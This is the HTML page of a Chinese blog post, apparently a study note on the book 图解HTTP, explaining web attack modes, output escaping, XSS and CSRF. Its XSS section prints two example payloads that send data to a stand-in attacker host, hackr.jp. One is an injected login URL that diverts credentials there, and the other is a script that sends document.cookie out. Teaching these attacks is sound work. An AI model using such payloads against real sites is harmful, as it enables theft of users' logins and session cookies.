@@ -1,0 +1,369 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Brown Hu</title>
+<meta name="description" content="Better late then never" />
+<link rel="shortcut icon" href="https://hubingliang.github.io/favicon.ico?v=1565232217630">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.remixicon.com/releases/v1.3.1/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://hubingliang.github.io/styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="remixicon-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://hubingliang.github.io">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://hubingliang.github.io/images/avatar.png?v=1565232217630" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">Brown Hu</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%85%B3%E4%BA%8Eweb%E7%9A%84%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5">关于Web的攻击手段</a>
+<ul>
+<li><a href="#%E9%92%88%E5%AF%B9web%E5%BA%94%E7%94%A8%E7%9A%84%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F">针对Web应用的攻击模式</a></li>
+<li><a href="#%E5%9B%A0%E8%BE%93%E5%87%BA%E5%80%BC%E8%BD%AC%E4%B9%89%E4%B8%8D%E5%AE%8C%E5%85%A8%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E">因输出值转义不完全引发的安全漏洞</a></li>
+</ul>
+</li>
+<li><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBxss">跨站脚本攻击（XSS）</a>
+<ul>
+<li><a href="#%E7%AE%80%E5%8D%95%E4%BE%8B%E5%AD%90">简单例子</a></li>
+</ul>
+</li>
+<li><a href="#xss-%E6%98%AF%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8%E9%A2%84%E5%85%88%E8%AE%BE%E7%BD%AE%E7%9A%84%E9%99%B7%E9%98%B1%E8%A7%A6%E5%8F%91%E7%9A%84%E8%A2%AB%E5%8A%A8%E6%94%BB%E5%87%BB">XSS 是攻击者利用预先设置的陷阱触发的被动攻击</a>
+<ul>
+<li><a href="#%E5%AF%B9%E7%94%A8%E6%88%B7cookie%E7%9A%84%E7%AA%83%E5%8F%96%E6%94%BB%E5%87%BB">对用户Cookie的窃取攻击</a></li>
+</ul>
+</li>
+<li><a href="#%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0csrf">跨站点请求伪造(CSRF)</a>
+<ul>
+<li><a href="#%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E7%9A%84%E6%94%BB%E5%87%BB%E6%A1%88%E4%BE%8B">跨站点请求伪造的攻击案例</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="remixicon-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.6000000000000001s">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">C'est la vie</div>
+    <a class="rss" href="https://hubingliang.github.io/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">认识HTTP----Web安全与攻击手段</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2017-09-09 / 2 min read
+        </div>
+        
+          <img class="post-feature-image rounded-lg mx-auto my-4" src="https://hubingliang.github.io/post-images/securi.jpeg" alt="">
+        
+        <div class="post-content yue">
+          <p><strong>本文内容大多参考<a href="https://book.douban.com/subject/25863515/">《图解HTTP》一书</a></strong></p>
+<h2 id="关于web的攻击手段">关于Web的攻击手段</h2>
+<p>目前，互联网攻击大多是针对应用HTTP协议的服务器和客户端，以及运行在服务器上的Web应用等资源，本文主要针对Web应用的攻击技术进行简单分析。</p>
+<h3 id="针对web应用的攻击模式">针对Web应用的攻击模式</h3>
+<p>对Web应用的攻击模式有以下两种。</p>
+<ul>
+<li>主动攻击<br>
+主动攻击（active attack）是指攻击者通过直接访问Web 应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源。</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-3b2645de43c3de0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="这个攻击者没法吐槽"></p>
+<ul>
+<li>被动攻击<br>
+被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标Web 应用访问发起攻击。<br>
+被动攻击通常的攻击模式如下所示。</li>
+</ul>
+<ol>
+<li>攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的HTTP 请求。</li>
+<li>当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱。</li>
+<li>中招后的用户浏览器会把含有攻击代码的HTTP 请求发送给作为攻击目标的Web 应用，运行攻击代码。</li>
+<li>执行完攻击代码，存在安全漏洞的Web 应用会成为攻击者的跳板，可能导致用户所持的Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果。被动攻击模式中具有代表性的攻击是跨站脚本攻击（xss）和跨站点请求伪造（CSRF/XSRF）。</li>
+</ol>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-72423c77abb5909d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h3 id="因输出值转义不完全引发的安全漏洞">因输出值转义不完全引发的安全漏洞</h3>
+<p>实施Web 应用的安全对策可大致分为以下两部分。</p>
+<ul>
+<li>客户端验证</li>
+<li>Web应用端（服务器）验证
+<ul>
+<li>输入值验证</li>
+<li>输出值转义</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-511ebfb85ffa5947.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>多数情况下采用JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭JavaScript，不适合将JavaScript 验证作为安全的防范对策。保留客户端验证只是为了尽早地辨识输入错误，起到提高UI 体验的作用。<br>
+Web 应用端的输入值验证按Web 应用内的处理则有可能被误认为是具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策。<br>
+从数据库或文件系统、HTML、邮件等输出Web 应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。</p>
+<h2 id="跨站脚本攻击xss">跨站脚本攻击（XSS）</h2>
+<p>跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或者Javascript的一种攻击。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。<br>
+跨站脚本攻击有可能造成以下影响：</p>
+<ul>
+<li>利用虚假输入表单骗取用户个人信息。</li>
+<li>利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。</li>
+<li>显示伪造的文章或图片（莫名其妙的广告）。</li>
+</ul>
+<h3 id="简单例子">简单例子</h3>
+<p><strong>在动态生成HTML处发生：</strong></p>
+<p>下面以编辑个人信息页面为例讲解跨站脚本攻击。下方界面显示了用户输入的个人信息内容。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-f42a8f9323739e75.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="跨站脚本攻击案例"></p>
+<p>确认界面按原样显示在编辑界面输入的字符串。此处输入带有山口<br>
+一郎这样的HTML 标签的字符串。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-ec25584204f71ee4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="按照输入内容原样显示的机制"></p>
+<p>此时的确认界面上，浏览器会把用户输入的<code>&lt;s&gt;</code> 解析成HTML 标签，然后显示删除线。<br>
+删除线显示出来并不会造成太大的不利后果，但如果换成使用script 标签将会如何呢。</p>
+<h2 id="xss-是攻击者利用预先设置的陷阱触发的被动攻击">XSS 是攻击者利用预先设置的陷阱触发的被动攻击</h2>
+<p>跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于攻击的陷阱。<br>
+下图网站通过地址栏中URI 的查询字段指定ID，即相当于在表单内自动填写字符串的功能。而就在这个地方，隐藏着可执行跨站脚本攻击的漏洞。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-23e6fa19d23f219e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>
+充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶意代码的URL。并隐藏植入事先准备好的欺诈邮件中或Web 页面内，诱使用户去点击该URL。</p>
+<pre><code>http://example.jp/login?ID=&quot;&gt;&lt;script&gt;var+f=document⇒
+.getElementById(&quot;login&quot;);+f.action=&quot;http://hackr.jp/pwget&quot;;+f.method=⇒
+&quot;get&quot;;&lt;/script&gt;&lt;span+s=&quot;
+</code></pre>
+<p>浏览器打开该URI 后，直观感觉没有发生任何变化，但设置好的脚本却偷偷开始运行了。当用户在表单内输入ID 和密码之后，就会直接发送到攻击者的网站（也就是hackr.jp），导致个人登录信息被窃取。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-d9c24bd7a2426f2b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>之后，ID 及密码会传给该正规网站，而接下来仍然是按正常登录步骤，用户很难意识到自己的登录信息已遭泄露。</p>
+<p><strong>对 http://example.jp/login?ID=yama 请求时对应的HTML源代码（摘录）</strong></p>
+<pre><code class="language-html">&lt;div class=&quot;logo&quot;&gt;
+![](/img/logo.gif)
+&lt;/div&gt;
+&lt;form action=&quot;http://example.jp/login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;
+&lt;div class=&quot;input_id&quot;&gt;
+ID &lt;input type=&quot;text&quot; name=&quot;ID&quot; value=&quot;yama&quot; /&gt;
+&lt;/div&gt;
+</code></pre>
+<pre><code class="language-html">**http://example.jp/login?ID=&quot;&gt;&lt;script&gt;var+f=document.getElementById
+(&quot;login&quot;);+f.action=&quot;http://hackr.jp/pwget&quot;;+f.method=&quot;get&quot;;&lt;/script&gt;
+&lt;span+s=&quot;对请求时对应的HTML源代码（摘录）**
+</code></pre>
+<pre><code class="language-html">&lt;div class=&quot;logo&quot;&gt;
+![](/img/logo.gif)
+&lt;/div&gt;
+&lt;form action=&quot;http://example.jp/login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;
+&lt;div class=&quot;input_id&quot;&gt;
+ID &lt;input type=&quot;text&quot; name=&quot;ID&quot; value=&quot;&quot;&gt;&lt;script&gt;var f=document⇒
+.getElementById(&quot;login&quot;); f.action=&quot;http://hackr.jp/pwget&quot;; f.method=⇒
+&quot;get&quot;;&lt;/script&gt;&lt;span s=&quot;&quot; /&gt;
+&lt;/div&gt;
+</code></pre>
+<h3 id="对用户cookie的窃取攻击">对用户Cookie的窃取攻击</h3>
+<p>除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的Cookie 信息。<br>
+<code>&lt;script src=http://hackr.jp/xss.js&gt;&lt;/script&gt;</code><br>
+该脚本内指定的http://hackr.jp/xss.js 文件。即下面这段采用JavaScript 编写的代码。</p>
+<pre><code class="language-js">var content = escape(document.cookie);
+document.write(&quot;&lt;img src=http://hackr.jp/?&quot;);
+document.write(content);
+document.write(&quot;&gt;&quot;);
+</code></pre>
+<p>在存在可跨站脚本攻击安全漏洞的Web 应用上执行上面这段JavaScript 程序，即可访问到该Web 应用所处域名下的Cookie 信息。然后这些信息会发送至攻击者的Web 网站（http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的Cookie 信息了。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-73e389217a5eca2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="使用XSS 攻击夺取Cookie 信息"></p>
+<h2 id="跨站点请求伪造csrf">跨站点请求伪造(CSRF)</h2>
+<p>跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。<br>
+跨站点请求伪造有可能会造成以下等影响。</p>
+<ul>
+<li>利用已通过认证的用户权限更新设定信息等</li>
+<li>利用已通过认证的用户权限购买商品</li>
+<li>利用已通过认证的用户权限在留言板上发表言论</li>
+</ul>
+<h3 id="跨站点请求伪造的攻击案例">跨站点请求伪造的攻击案例</h3>
+<p>下面以留言板功能为例，讲解跨站点请求伪造。该功能只允许已认证并登录的用户在留言板上发表内容。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/4337988-aa8130ff059c20c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="跨站点请求伪造的攻击案例"></p>
+<p>在该留言板系统上，受害者用户A 是已认证状态。它的浏览器中的Cookie 持有已认证的会话ID（步骤①）<br>
+攻击者设置好一旦用户访问，即会发送在留言板上发表非主观行为产生的评论的请求的陷阱。用户A 的浏览器执行完陷阱中的请求后，留言板上也就会留下那条评论（步骤②）。<br>
+触发陷阱之际，如果用户A 尚未通过认证，则无法利用用户A 的身份权限在留言板上发表内容。</p>
+
+        </div>
+
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://hubingliang.github.io/tag/HTTP">
+            <span class="flex-auto">HTTP</span>
+          </a>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+            <div class="prev-post">
+              <a href="https://hubingliang.github.io/post/emoji">
+                <h3 class="post-title">
+                  <i class="remixicon-arrow-left-line"></i>
+                  如何在你的项目中引入emoji😀
+                </h3>
+              </a>
+            </div>
+          
+
+          
+            <div class="next-post">
+              <a href="https://hubingliang.github.io/post/inherit">
+                <h3 class="post-title">
+                  JavaScript继承新旧方法汇总
+                  <i class="remixicon-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="/media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
